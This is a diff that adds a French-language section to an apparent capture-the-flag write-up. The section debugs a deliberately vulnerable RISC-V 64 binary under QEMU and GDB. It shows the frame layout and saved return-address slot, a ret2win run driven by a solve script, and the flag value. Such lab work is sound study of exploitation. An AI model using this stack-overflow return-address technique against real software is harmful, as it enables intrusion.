@@ -150,6 +150,81 @@ Sur RISC-V le retour fait `ldsp ra` + `jr ra` : il suffit d’écraser `ra` avec
 
 ---
 
+## Debug GDB (pas à pas) — RISC-V
+
+Arch **RISC-V 64** : le GDB hôte x86_64 ne charge / n’exécute pas ce binaire tel quel. Il faut **`qemu-riscv64`** (user) + **`gdb-multiarch`** (ou un GDB configuré `riscv64`).
+
+> Sur le serveur dédié de ce repo : pas d’émulateur RISC-V → section écrite pour une machine où `qemu-riscv64` / `gdb-multiarch` sont installés. La vérif locale reste `--check` statique.
+
+### 4.1 Lancer sous QEMU + gdbstub
+
+Terminal A :
+
+```bash
+qemu-riscv64 -g 1234 ./original/securevault
+```
+
+Terminal B :
+
+```bash
+gdb-multiarch -q ./original/securevault
+(gdb) set arch riscv:rv64
+(gdb) target remote :1234
+(gdb) info address win                    # 0x10476
+(gdb) info address vulnerable_function    # 0x104ac
+(gdb) break vulnerable_function
+(gdb) continue
+```
+
+### 4.2 Frame et `ra`
+
+```text
+(gdb) disassemble vulnerable_function
+# c.addi16sp sp, -0x50
+# c.sdsp     ra, 0x48(sp)
+# …
+# read(0, sp, 0x100)
+# c.ldsp     ra, 0x48(sp)
+# c.jr       ra
+```
+
+```text
+(gdb) break *vulnerable_function+…       # juste avant read, ou après
+(gdb) continue
+# taper un code court d’abord pour voir le chemin nominal
+(gdb) print/x $ra                        # retour vers main
+(gdb) x/gx $sp+0x48                      # slot saved ra
+```
+
+### 4.3 Ret2win sous le debugger
+
+```text
+(gdb) break win
+(gdb) # redémarrer qemu+gdb avec le payload :
+# python3 tools/securevault-solve.py --payload | qemu-riscv64 -g 1234 ./original/securevault
+(gdb) continue
+# hit win → puts FLAG
+(gdb) x/s 0x533b0                        # FLAG{0x8A7_RISCV_ROP_WIN}
+```
+
+Sans GDB, live direct :
+
+```bash
+python3 tools/securevault-solve.py --payload | qemu-riscv64 ./original/securevault
+```
+
+### 4.4 Inspection statique (sans QEMU)
+
+```bash
+readelf -s original/securevault | grep -E ' win$|vulnerable_function| main$'
+# win @ 0x10476, vulnerable_function @ 0x104ac, main @ 0x104ea
+python3 tools/securevault-solve.py --check
+```
+
+Capstone / `riscv64-linux-gnu-objdump -d` si la toolchain cross est installée — même prologue que §3.
+
+---
+
 ## 4. Vérification
 
 **Statique** (ce serveur, sans QEMU) :
